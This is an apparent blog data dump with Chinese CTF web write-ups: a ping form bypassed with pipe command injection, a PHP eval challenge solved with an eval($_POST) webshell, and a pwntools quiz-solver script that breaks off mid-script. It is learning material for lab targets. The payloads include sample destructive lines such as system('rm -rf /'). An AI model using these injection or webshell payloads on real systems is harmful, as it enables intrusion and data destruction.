方法三：用HackBar直接提交到后端\n\n我们在审查源码的时候，看到他是POST表单提交，表单的参数名是command，所以我们想到可以直接使用HackBar提交后端的方法，来绕过前端的校验\n\n<form action="" method="POST" onsubmit="return check_ip()">\n     <input id="command" name="command" type="text" placeholder="Enter an IP address"/>\n     <input name="ping" type="submit" value="Ping"/>\n</form>\n\n\n1\n2\n3\n4\n\n\n发送一个POST请求，form表单参数为\n\ncommand=127.0.0.1|ls /\n\n\n1\n\n\n\n\n同方法一相同，我们使用cat命令即可拿到flag\n\n\n# 方法四：使用BurpSuite抓包修改\n\n如果有抓包的习惯，可以使用BurpSuite抓包，',normalizedContent:'[litctf 2023]这套题是web方向入门题单，这是我的第22题\n\n\n\n * 题目描述：看看能ping出什么\n * 考点：前端禁用&命令执行\n * 预期解：\n * 方法一：js禁用\n * 方法二：js hook\n * 方法三：用hackbar直接提交到后端\n * 方法四：使用burpsuite抓包修改\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称   题目方向   难度\n3873   ping   web    1\n\n\n# 题目22：ping\n\n\n# 题目描述：看看能ping出什么\n\n\n# 考点：前端禁用&命令执行\n\n\n# 预期解：\n\n进入页面后，我们看到提示ping一下\n\n\n\n我们先尝试ping了一下127.0.0.1，返回了正常ping的结果\n\nping 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.047 ms\n64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.055 ms\n64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.045 ms\n64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.052 ms\n64 bytes from 127.0.0.1: seq=4 ttl=42 time=0.057 ms\n64 bytes from 127.0.0.1: seq=5 ttl=42 time=0.060 ms\n--- 127.0.0.1 ping statistics ---\n6 packets transmitted, 6 packets received, 0% packet loss\nround-trip min/avg/max = 0.045/0.052/0.060 ms\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n我们尝试使用命令拼接，也就是在ip地址后加上 “|” ，提示“敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦”\n\n除此之外，还应该点开f12审查元素，这是我们要养成的良好习惯之一，可以看到这里是在前端做了校验，只能输入数字、点这两种符号，如果违规输入前端就会直接拦截。\n\n  <body>\n    <div class="container">\n      <h1>试着ping一下吧</h1>\n      <script type="text/javascript">\n  function check_ip(){\n    let ip = document.getelementbyid(\'command\').value;\n    let re = /^(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)$/;\n    if(re.test(ip.trim())){\n      return true;\n    }\n    alert(\'敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦\');\n    return false;\n  }\n<\/script>\n      <form action="" method="post" onsubmit="return check_ip()">\n          <input id="command" name="command" type="text" placeholder="enter an ip address"/>\n          <input name="ping" type="submit" value="ping"/>\n      </form>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n此时我们有多种方式可以绕过前端的校验\n\n\n# 方法一：js禁用\n\n在f12页面点击设置，将javascript禁用掉，这种方法是不会影响我们提交的，因为提交是form表单提交的，和js没有关系，js只是校验它是不是ip地址\n\n\n\n在禁用掉js以后，我们重新拼接ip地址和命令，用管道符连接\n\n127.0.0.1|ls /\n\n\n1\n\n\n\n\n可以看到flag文件就在根目录，直接输入命令展示flag内容即可看到flag内容\n\n127.0.0.1|cat /flag\n\n\n1\n\n\n> 这种方法要记得常用的命令拼接方法，比如最常用的是管道符\n> \n> command1 && command2 先执行 command1，如果为真，再执行 command2\n> \n> command1 | command2 只执行 command2\n> \n> command1 & command2 先执行 command2 后执行 command1\n> \n> command1 || command2 先执行 command1，如果为假，再执行 command2\n\n\n# 方法二：js hook\n\n我们在用f12审查元素，审查js代码，函数名是check_ip\n\n<script type="text/javascript">\n  function check_ip(){\n    let ip = document.getelementbyid(\'command\').value;\n    let re = /^(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)$/;\n    if(re.test(ip.trim())){\n      return true;\n    }\n    alert(\'敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦\');\n    return false;\n  }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n复制这个函数名，我们到f12开发者工具的console控制台页面\n\n将check_ip这个函数置为空，其实就是将默认的函数名name和参数params删掉，回车即可\n\n\n\n然后同方法一相同，使用管道符在ip地址后拼接命令，即可拿到flag\n\n\n# 方法三：用hackbar直接提交到后端\n\n我们在审查源码的时候，看到他是post表单提交，表单的参数名是command，所以我们想到可以直接使用hackbar提交后端的方法，来绕过前端的校验\n\n<form action="" method="post" onsubmit="return check_ip()">\n     <input id="command" name="command" type="text" placeholder="enter an ip address"/>\n     <input name="ping" type="submit" value="ping"/>\n</form>\n\n\n1\n2\n3\n4\n\n\n发送一个post请求，form表单参数为\n\ncommand=127.0.0.1|ls /\n\n\n1\n\n\n\n\n同方法一相同，我们使用cat命令即可拿到flag\n\n\n# 方法四：使用burpsuite抓包修改\n\n如果有抓包的习惯，可以使用burpsuite抓包，',charsets:{cjk:!0},lastUpdated:"2024/12/01, 19:03:09",lastUpdatedTimestamp:1733050989e3},{title:"吾杯网络安全技能大赛[Web方向]-HelloHacker",frontmatter:{title:"吾杯网络安全技能大赛[Web方向]-HelloHacker",date:"2024-12-02T00:00:00.000Z",tags:["CTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-12-02-2-CTF-WebHelloHacker-WriteUp.html",relativePath:"views/essay/2024-12-02-2-CTF-WebHelloHacker-WriteUp.md",key:"v-225ba498",path:"/views/essay/2024-12-02-2-CTF-WebHelloHacker-WriteUp.html",headers:[{level:3,title:"题目描述：你看到的不一定是真的",slug:"题目描述-你看到的不一定是真的",normalizedTitle:"题目描述：你看到的不一定是真的",charIndex:46},{level:3,title:"考点：编程基础&WebShell",slug:"考点-编程基础-webshell",normalizedTitle:"考点：编程基础&amp;webshell",charIndex:null},{level:3,title:"预期解：找到prohibited文件里缺失的排序，用WebShell控制服务器",slug:"预期解-找到prohibited文件里缺失的排序-用webshell控制服务器",normalizedTitle:"预期解：找到prohibited文件里缺失的排序，用webshell控制服务器",charIndex:85},{level:3,title:"原思路：",slug:"原思路",normalizedTitle:"原思路：",charIndex:128}],excerpt:'<Boxx/>\n<p>参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第25题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>网址【<a href="https://www.wucup.net/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>无</td>\n<td>HelloHacker</td>\n<td>Web</td>\n<td>简单</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：你看到的不一定是真的 考点：编程基础&WebShell 预期解：找到prohibited文件里缺失的排序，用WebShell控制服务器 原思路：",content:"参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第25题\n\n\n\n * 题目描述：你看到的不一定是真的\n * 考点：编程基础&WebShell\n * 预期解：找到prohibited文件里缺失的排序，用WebShell控制服务器\n * 原思路：\n\n\n\n * 网址【传送门】\n\n题目编号   题目名称          题目方向   难度\n无      HelloHacker   Web    简单\n\n\n# 题目25：HelloHacker\n\n\n# 题目描述：你看到的不一定是真的\n\n\n# 考点：编程基础&WebShell\n\n\n# 预期解：找到prohibited文件里缺失的排序，用WebShell控制服务器\n\n进入靶机，我们看到页面中显示了一些PHP代码，我们需要做代码审计（本人薄弱项，需要加强php的学习）\n\n\n\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude_once 'check.php';\ninclude_once 'ban.php';\n\n$incompetent = $_POST['incompetent'];\n$WuCup = $_POST['WuCup'];\n\nif ($incompetent !== 'HelloHacker') {\n    die('Come invade!');\n}\n\n$required_chars = ['p', 'e', 'v', 'a', 'n', 'x', 'r', 'o', 'z'];\n$is_valid = true;\n\nif (!checkRequiredChars($WuCup, $required_chars)) {\n    $is_valid = false;\n}\n\nif ($is_valid) {\n\n    $prohibited_file = 'prohibited.txt';\n    if (file_exists($prohibited_file)) {\n        $file = fopen($prohibited_file, 'r');\n        \nwhile ($line = fgets($file)) {\n    $line = rtrim($line, \"\\r\\n\");  \n    if ($line === '' && strpos($WuCup, ' ') === false) {\n      \n        continue;\n    }\n    if (stripos($WuCup, $line) !== false) {\n        fclose($file);  \n        die('this road is blocked');\n    }\n}\n        fclose($file);  \n    }\n\n    eval($WuCup);\n} else {\n    die('NO！NO！NO！');\n}\n\n?>\nCome invade!\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n我在看到代码后，因为对php代码的不熟悉，上了AI来阅读代码，算是作弊了，在未来公司的比赛环境中，应该是禁止连接外网的。\n\n这段代码最关键的几个点\n\n 1. 引入了一个叫prohibited.txt的文件\n 2. 需要用POST方法传入incompetent和WuCup这两个参数\n 3. 在验证完是否含有pevanxroz，并和prohibited.txt的文件内容做了对比校验后，执行了eval()函数\n\n阅读代码后，我们发现需要incompetent=HelloHacker，并且WuCup需要具有pevanxroz的所有字母，且和文件中任意一行“没有交集”即可\n\n然后我们查看prohibited.txt的文件，这里需要特别仔细、认真的去观察这个文件，首先发现这个文件的符号部分是有空格的，这个有了空格，就会和我们的命令匹配不上，导致prohibited.txt这一行的屏蔽就是失败的（讲真的，这个真的很难很难发现，需要装一个显示空格的插件，才能在编辑器里发现这个空格）\n\n\n\n其次，prohibited.txt这个文件的后半部分，是pevanxroz这段字符的各种排序，需要写段代码查找哪个排序方式没有被这个文件列出来\n\n# 导入itertools这个库 在这段代码中主要用于生成字符串的全排列\nimport itertools\n# 找到当前路径，赋值给whereisi\nwhereisi = __file__[:__file__.rfind('\\\\')+1]\n# 定义一个字符串，后续需要对这个字符串进行操作\nstring = 'erozxapvn'\n# 用只读模式打开prohibited.txt\nwith open(whereisi + 'prohibited.txt', 'r') as f:\n    # 读取每一行的内容赋值给lines，生成了一个列表[]\n    lines = f.readlines()\n    # 列表推导式 遍历每一行的每一个元素，并用strip去掉字符开头和结尾的空格 处理后重新赋值给lines\n    lines = [i.strip() for i in lines]\n    \"\"\"\n    测试string的所有排列方式，是否在文件中\n    遍历 并且使用itertools的permutations方法 \n    itertools.permutations(string, len(string)) 会生成字符串 string 的所有全排列组合\n    排列的长度与原字符串长度相同。例如，如果 string 是 abc\n    那么它会生成 ['abc', 'acb', 'bac', 'bca', 'cab', 'cba'] 这样的全排列列表。\n    \"\"\"\n    for i in itertools.permutations(string, len(string)):\n        # 每次循环，都会从生成的排列中取出一个来，重新赋值给i\n        i = ''.join(i)\n        # 设置一个循环，如果i不在这个lines列表里，就输出i\n        if i not in lines:\n            print(i)\n            break\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n这个想法确实非常细致，确实要先去验证这个txt是否包含所有的排列方式，这种思维方式确实值得学习\n\n运行代码，找到这个缺失的排序是orzexapvn（这个方法发现找到这个排序太慢了，等官方题解出了看看有没有更快 的方式）\n\n根据没有被屏蔽的符号和函数，我们构造一下payload参数，向该地址发一个POST请求，参数为以下内容\n\n?incompetent=HelloHacker\n&WuCup=eval($_POST[0]);#oxzverapn\n&0=system(\"cat /flag\");\n\n\n1\n2\n3\n\n\n这段参数的意思是，我们先传入incompetent=HelloHacker让它符合起初的条件，然后传入一个WuCup，让他等于一个WebShell的木马，因为我们包含了oxzverapn，所以会通过校验，执行到之前php代码中提到的eval()函数的部分，最后我们让变量0执行一个system()的函数，这个system的函数主要用于执行服务器命令，通过cat命令查看flag文件内容。\n\n>  1. eval () 函数\n>     * 定义与功能\n>       * eval()函数是 PHP 中的一个非常强大但也很危险的函数。它将传入的字符串作为 PHP 代码进行求值并执行。例如，eval('echo \"Hello, World!\";');会输出Hello, World!。这个函数可以动态地执行 PHP 代码，使得程序能够根据不同的条件或者用户输入来运行不同的代码片段。\n>     * 应用场景\n>       * 模板引擎：在一些简单的模板引擎实现中，eval()函数可以用于将模板中的变量替换和代码片段动态地转换为可执行的 PHP 代码。例如，将模板中的<?php echo $variable;?>这样的代码片段替换为实际的变量值后，使用eval()函数来执行最终的输出逻辑。\n>       * 代码生成与执行：当需要根据用户的配置或者规则动态地生成并执行 PHP 代码时，eval()函数可以派上用场。比如，一个自定义的脚本语言解释器，可以将用户编写的自定义脚本转换为 PHP 代码字符串，然后使用eval()函数来执行。\n>     * 安全风险\n>       * 代码注入：如果用户能够控制传入eval()函数的字符串，就可以注入恶意的 PHP 代码。例如，如果用户输入eval($_GET['code']);，攻击者就可以通过构造类似http://example.com?code=system(\"rm -rf /\");这样的 URL 来删除服务器上的文件，这是非常危险的。所以在使用eval()函数时，必须对传入的内容进行严格的验证和过滤，确保其安全性。\n>  2. system () 函数\n>     * 定义与功能\n>       * system()函数用于在 PHP 中执行外部命令，并输出命令执行后的结果。例如，system('ls -l');会在服务器上执行ls -l命令（列出当前目录下文件的详细信息），并将命令的结果输出到浏览器或者命令行终端（取决于 PHP 的运行环境）。它会创建一个子进程来执行指定的命令。\n>     * 应用场景\n>       * 系统管理任务：在服务器端的 PHP 应用程序中，如果需要执行一些系统管理相关的任务，如备份数据库（system('mysqldump -u root -p password database > backup.sql');）、清理日志文件（system('rm -rf /var/log/old_logs');）等，可以使用system()函数。\n>       * 与外部程序交互：当 PHP 应用程序需要与外部的命令行工具或者其他程序进行交互时，system()函数可以用来调用这些程序并获取它们的输出。例如，调用一个图像处理工具来对服务器上的图像文件进行处理。\n>     * 安全风险\n>       * 命令注入：和eval()函数类似，system()函数也存在严重的安全风险。如果用户能够控制传入system()函数的命令字符串，就可以执行任意的系统命令。例如，system($_GET['command']);这样的代码是非常危险的，攻击者可以通过构造恶意的 URL 来执行诸如删除文件、获取敏感信息等恶意操作。因此，在使用system()函数时，必须对用户输入的内容进行严格的过滤和验证，防止命令注入攻击。\n\n\n\n\n# 原思路：\n\n看到题目后，我尝试打开了check.php页面，发现只提示了Hacker have nothing you want here!\n\n\n\n我用HackBar传了incompetent和WuCup这两个参数，一直在调整WuCup的内容，但没有想到是prohibited.txt的文件内容里，包含了大部分的符号，以及pevanxroz的大部分顺序（我做题时以为是所有顺序），导致用pevanxroz后边加了很多字符的方式，想通过校验，但一直失败了，没完成题目。",normalizedContent:"参加了第一届吾杯网络安全技能大赛，这是一道web方向的签到题，这是我的第25题\n\n\n\n * 题目描述：你看到的不一定是真的\n * 考点：编程基础&webshell\n * 预期解：找到prohibited文件里缺失的排序，用webshell控制服务器\n * 原思路：\n\n\n\n * 网址【传送门】\n\n题目编号   题目名称          题目方向   难度\n无      hellohacker   web    简单\n\n\n# 题目25：hellohacker\n\n\n# 题目描述：你看到的不一定是真的\n\n\n# 考点：编程基础&webshell\n\n\n# 预期解：找到prohibited文件里缺失的排序，用webshell控制服务器\n\n进入靶机，我们看到页面中显示了一些php代码，我们需要做代码审计（本人薄弱项，需要加强php的学习）\n\n\n\n<?php\nhighlight_file(__file__);\nerror_reporting(0);\ninclude_once 'check.php';\ninclude_once 'ban.php';\n\n$incompetent = $_post['incompetent'];\n$wucup = $_post['wucup'];\n\nif ($incompetent !== 'hellohacker') {\n    die('come invade!');\n}\n\n$required_chars = ['p', 'e', 'v', 'a', 'n', 'x', 'r', 'o', 'z'];\n$is_valid = true;\n\nif (!checkrequiredchars($wucup, $required_chars)) {\n    $is_valid = false;\n}\n\nif ($is_valid) {\n\n    $prohibited_file = 'prohibited.txt';\n    if (file_exists($prohibited_file)) {\n        $file = fopen($prohibited_file, 'r');\n        \nwhile ($line = fgets($file)) {\n    $line = rtrim($line, \"\\r\\n\");  \n    if ($line === '' && strpos($wucup, ' ') === false) {\n      \n        continue;\n    }\n    if (stripos($wucup, $line) !== false) {\n        fclose($file);  \n        die('this road is blocked');\n    }\n}\n        fclose($file);  \n    }\n\n    eval($wucup);\n} else {\n    die('no！no！no！');\n}\n\n?>\ncome invade!\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n我在看到代码后，因为对php代码的不熟悉，上了ai来阅读代码，算是作弊了，在未来公司的比赛环境中，应该是禁止连接外网的。\n\n这段代码最关键的几个点\n\n 1. 引入了一个叫prohibited.txt的文件\n 2. 需要用post方法传入incompetent和wucup这两个参数\n 3. 在验证完是否含有pevanxroz，并和prohibited.txt的文件内容做了对比校验后，执行了eval()函数\n\n阅读代码后，我们发现需要incompetent=hellohacker，并且wucup需要具有pevanxroz的所有字母，且和文件中任意一行“没有交集”即可\n\n然后我们查看prohibited.txt的文件，这里需要特别仔细、认真的去观察这个文件，首先发现这个文件的符号部分是有空格的，这个有了空格，就会和我们的命令匹配不上，导致prohibited.txt这一行的屏蔽就是失败的（讲真的，这个真的很难很难发现，需要装一个显示空格的插件，才能在编辑器里发现这个空格）\n\n\n\n其次，prohibited.txt这个文件的后半部分，是pevanxroz这段字符的各种排序，需要写段代码查找哪个排序方式没有被这个文件列出来\n\n# 导入itertools这个库 在这段代码中主要用于生成字符串的全排列\nimport itertools\n# 找到当前路径，赋值给whereisi\nwhereisi = __file__[:__file__.rfind('\\\\')+1]\n# 定义一个字符串，后续需要对这个字符串进行操作\nstring = 'erozxapvn'\n# 用只读模式打开prohibited.txt\nwith open(whereisi + 'prohibited.txt', 'r') as f:\n    # 读取每一行的内容赋值给lines，生成了一个列表[]\n    lines = f.readlines()\n    # 列表推导式 遍历每一行的每一个元素，并用strip去掉字符开头和结尾的空格 处理后重新赋值给lines\n    lines = [i.strip() for i in lines]\n    \"\"\"\n    测试string的所有排列方式，是否在文件中\n    遍历 并且使用itertools的permutations方法 \n    itertools.permutations(string, len(string)) 会生成字符串 string 的所有全排列组合\n    排列的长度与原字符串长度相同。例如，如果 string 是 abc\n    那么它会生成 ['abc', 'acb', 'bac', 'bca', 'cab', 'cba'] 这样的全排列列表。\n    \"\"\"\n    for i in itertools.permutations(string, len(string)):\n        # 每次循环，都会从生成的排列中取出一个来，重新赋值给i\n        i = ''.join(i)\n        # 设置一个循环，如果i不在这个lines列表里，就输出i\n        if i not in lines:\n            print(i)\n            break\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n这个想法确实非常细致，确实要先去验证这个txt是否包含所有的排列方式，这种思维方式确实值得学习\n\n运行代码，找到这个缺失的排序是orzexapvn（这个方法发现找到这个排序太慢了，等官方题解出了看看有没有更快 的方式）\n\n根据没有被屏蔽的符号和函数，我们构造一下payload参数，向该地址发一个post请求，参数为以下内容\n\n?incompetent=hellohacker\n&wucup=eval($_post[0]);#oxzverapn\n&0=system(\"cat /flag\");\n\n\n1\n2\n3\n\n\n这段参数的意思是，我们先传入incompetent=hellohacker让它符合起初的条件，然后传入一个wucup，让他等于一个webshell的木马，因为我们包含了oxzverapn，所以会通过校验，执行到之前php代码中提到的eval()函数的部分，最后我们让变量0执行一个system()的函数，这个system的函数主要用于执行服务器命令，通过cat命令查看flag文件内容。\n\n>  1. eval () 函数\n>     * 定义与功能\n>       * eval()函数是 php 中的一个非常强大但也很危险的函数。它将传入的字符串作为 php 代码进行求值并执行。例如，eval('echo \"hello, world!\";');会输出hello, world!。这个函数可以动态地执行 php 代码，使得程序能够根据不同的条件或者用户输入来运行不同的代码片段。\n>     * 应用场景\n>       * 模板引擎：在一些简单的模板引擎实现中，eval()函数可以用于将模板中的变量替换和代码片段动态地转换为可执行的 php 代码。例如，将模板中的<?php echo $variable;?>这样的代码片段替换为实际的变量值后，使用eval()函数来执行最终的输出逻辑。\n>       * 代码生成与执行：当需要根据用户的配置或者规则动态地生成并执行 php 代码时，eval()函数可以派上用场。比如，一个自定义的脚本语言解释器，可以将用户编写的自定义脚本转换为 php 代码字符串，然后使用eval()函数来执行。\n>     * 安全风险\n>       * 代码注入：如果用户能够控制传入eval()函数的字符串，就可以注入恶意的 php 代码。例如，如果用户输入eval($_get['code']);，攻击者就可以通过构造类似http://example.com?code=system(\"rm -rf /\");这样的 url 来删除服务器上的文件，这是非常危险的。所以在使用eval()函数时，必须对传入的内容进行严格的验证和过滤，确保其安全性。\n>  2. system () 函数\n>     * 定义与功能\n>       * system()函数用于在 php 中执行外部命令，并输出命令执行后的结果。例如，system('ls -l');会在服务器上执行ls -l命令（列出当前目录下文件的详细信息），并将命令的结果输出到浏览器或者命令行终端（取决于 php 的运行环境）。它会创建一个子进程来执行指定的命令。\n>     * 应用场景\n>       * 系统管理任务：在服务器端的 php 应用程序中，如果需要执行一些系统管理相关的任务，如备份数据库（system('mysqldump -u root -p password database > backup.sql');）、清理日志文件（system('rm -rf /var/log/old_logs');）等，可以使用system()函数。\n>       * 与外部程序交互：当 php 应用程序需要与外部的命令行工具或者其他程序进行交互时，system()函数可以用来调用这些程序并获取它们的输出。例如，调用一个图像处理工具来对服务器上的图像文件进行处理。\n>     * 安全风险\n>       * 命令注入：和eval()函数类似，system()函数也存在严重的安全风险。如果用户能够控制传入system()函数的命令字符串，就可以执行任意的系统命令。例如，system($_get['command']);这样的代码是非常危险的，攻击者可以通过构造恶意的 url 来执行诸如删除文件、获取敏感信息等恶意操作。因此，在使用system()函数时，必须对用户输入的内容进行严格的过滤和验证，防止命令注入攻击。\n\n\n\n\n# 原思路：\n\n看到题目后，我尝试打开了check.php页面，发现只提示了hacker have nothing you want here!\n\n\n\n我用hackbar传了incompetent和wucup这两个参数，一直在调整wucup的内容，但没有想到是prohibited.txt的文件内容里，包含了大部分的符号，以及pevanxroz的大部分顺序（我做题时以为是所有顺序），导致用pevanxroz后边加了很多字符的方式，想通过校验，但一直失败了，没完成题目。",charsets:{cjk:!0},lastUpdated:"2024/12/15, 11:33:34",lastUpdatedTimestamp:1734233614e3},{title:"NSSCTF-Web方向题目-WriteUP-NSSCTF-3876",frontmatter:{title:"NSSCTF-Web方向题目-WriteUP-NSSCTF-3876",date:"2024-12-03T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-12-03-1-CTF-3876-WriteUp.html",relativePath:"views/essay/2024-12-03-1-CTF-3876-WriteUp.md",key:"v-1dbb67f4",path:"/views/essay/2024-12-03-1-CTF-3876-WriteUp.html",headers:[{level:3,title:"题目描述：来点小学生喜欢的x 不会算错吧？",slug:"题目描述-来点小学生喜欢的x-不会算错吧",normalizedTitle:"题目描述：来点小学生喜欢的x 不会算错吧？",charIndex:42},{level:3,title:"考点：Python脚本",slug:"考点-python脚本",normalizedTitle:"考点：python脚本",charIndex:67},{level:3,title:"预期解：用Python编写脚本",slug:"预期解-用python编写脚本",normalizedTitle:"预期解：用python编写脚本",charIndex:82}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第26题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3876</td>\n<td>口算题卡</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：来点小学生喜欢的x 不会算错吧？ 考点：Python脚本 预期解：用Python编写脚本",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第26题\n\n\n\n * 题目描述：来点小学生喜欢的x 不会算错吧？\n * 考点：Python脚本\n * 预期解：用Python编写脚本\n\n\n\n * 题单【传送门】\n\n题目编号   题目名称   题目方向   难度\n3876   口算题卡   Web    1\n\n\n# 题目26：口算题卡\n\n\n# 题目描述：来点小学生喜欢的x 不会算错吧？\n\n\n# 考点：Python脚本\n\n\n# 预期解：用Python编写脚本\n\n进入页面后，页面提示\n\n\n __           ________      _________   ______       _________   ______    \n/_/\\         /_______/\\    /________/\\ /_____/\\     /________/\\ /_____/\\   \n\\:\\ \\        \\__.::._\\/    \\__.::.__\\/ \\:::__\\/     \\__.::.__\\/ \\::::_\\/_  \n \\:\\ \\          \\::\\ \\        \\::\\ \\    \\:\\ \\  __      \\::\\ \\    \\:\\/___/\\ \n  \\:\\ \\____     _\\::\\ \\__      \\::\\ \\    \\:\\ \\/_/\\      \\::\\ \\    \\:::._\\/ \n   \\:\\/___/\\   /__\\::\\__/\\      \\::\\ \\    \\:\\_\\ \\ \\      \\::\\ \\    \\:\\ \\   \n    \\_____\\___________________   \\__\\_____ \\_____\\______  \\__\\/     \\_\\/   \n          /_____/\\     /_____/\\     /_____/\\     /_____/\\                  \n          \\:::_:\\ \\    \\:::_ \\ \\    \\:::_:\\ \\    \\:::_:\\ \\                 \n              _\\:\\|     \\:\\ \\ \\ \\       _\\:\\|       /_\\:\\ \\                \n _______     /::_/__     \\:\\ \\ \\ \\     /::_/__      \\::_:\\ \\               \n/______/\\    \\:\\____/\\    \\:\\_\\ \\ \\    \\:\\____/\\    /___\\:\\ '              \n\\__::::\\/     \\_____\\/     \\_____\\/     \\_____\\/    \\______/               \n                                                                           \nWelcome to the LitCTF2023 Verbal Problem Card!\nYou will be presented with 100 addition and subtraction problems.\nYour goal is to answer all of them correctly to get the flag!\nif you wrong, you will be kicked out of the game.\nGood luck & Have fun!\nWhat is 86 - 32?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n看了别人的题解，用的是Python写了脚本\n\nfrom pwn import *\n# 从pwn库中导入所有内容，pwn库常用于编写漏洞利用相关脚本，提供了如与远程服务器交互、构造payload等功能\n\nio = remote('node4.anna.nssctf.cn', 28659)\n# 使用remote函数创建一个网络连接，连接到指定的远程主机（node4.anna.nssctf.cn）的指定端口（28659），\n# 后续通过io对象来和远程服务器进行数据的发送与接收操作\n\ncontext(arch='amd64', log_level='debug')\n# 通过context函数设置当前脚本执行的上下文环境，这里将架构设置为amd64，意味着后续相关操作按照64位体系结构处理，\n# 同时将日志级别设置为debug，会输出详细的调试信息，方便排查问题和查看交互情况\n\nio.recvuntil(b'What is ')\n# 通过io连接对象调用recvuntil函数，从远程服务器接收数据，直到遇到字节串b'What is '为止，\n# 目的是获取包含题目提示起始部分的完整内容\n\nfor i in range(100):\n    # 开始一个循环，循环100次，通常用于处理100轮类似的交互任务，比如连续回答100个题目，不过这里暂时没用到循环变量i的取值\n    line = io.recvuntil('?')\n    # 在每次循环中，继续从远程服务器接收数据，接收截止到遇到字符'?'为止，获取完整的包含具体运算题目的那一行内容，\n    # 并将接收到的数据赋值给变量line\n    if b'+' in line:\n        # 判断接收到的字节串line中是否包含字节串b'+'，如果包含则说明是加法运算题目，进入该分支进行加法相关处理\n        a = int(line[0:line.find(b'+')].strip(b' '))\n        # 提取加法运算的第一个操作数：\n        # 先通过line.find(b'+')找到字节串中b'+'的位置索引，然后截取从开头到b'+'之前的字节串部分，\n        # 再去除前后空格，最后将其转换为整数赋值给变量a\n        b = int(line[line.find(b'+') + 1:].strip(b'?').strip(b' '))\n        # 提取加法运算的第二个操作数：\n        # 截取从b'+'后面一位开始到字节串末尾的部分，先去除末尾的'?'字符（因为recvuntil接收到'?'截止），\n        # 再去除前后空格，最后转换为整数赋值给变量b\n        payload = a + b\n        # 将两个操作数相加，把相加的结果赋值给变量payload，这个payload就是加法运算题目的答案，后续要发送给服务器\n    else:\n        # 如果字节串line中不包含b'+'，则进入该else分支，意味着是减法运算题目，进行减法相关处理\n        a = int(line[0:line.find(b'-')].strip(b' '))\n        # 提取减法运算的被减数：\n        # 原理和加法中提取第一个操作数类似，通过line.find(b'-')找到b'-'的位置，截取开头到b'-'之前的字节串部分，\n        # 去除空格后转换为整数赋值给a\n        b = int(line[line.find(b'-') + 1:].strip(b'?').strip(b' '))\n        # 提取减法运算的减数：\n        # 截取b'-'后面的字节串部分，经过去除末尾的'?'以及前后空格等处理后，转换为整数赋值给变量b\n        payload = a - b\n        # 计算两数相减的结果，并将结果赋值给payload，这个payload就是减法运算题目的答案，后续要发送给服务器\n    io.send(str(payload))\n    # 将计算得到的答案（存放在payload变量中）转换为字符串（因为网络发送文本数据需要字符串类型），\n    # 然后通过io连接对象的send函数将答案发送给远程服务器，完成对当前运算题目的回复操作\n    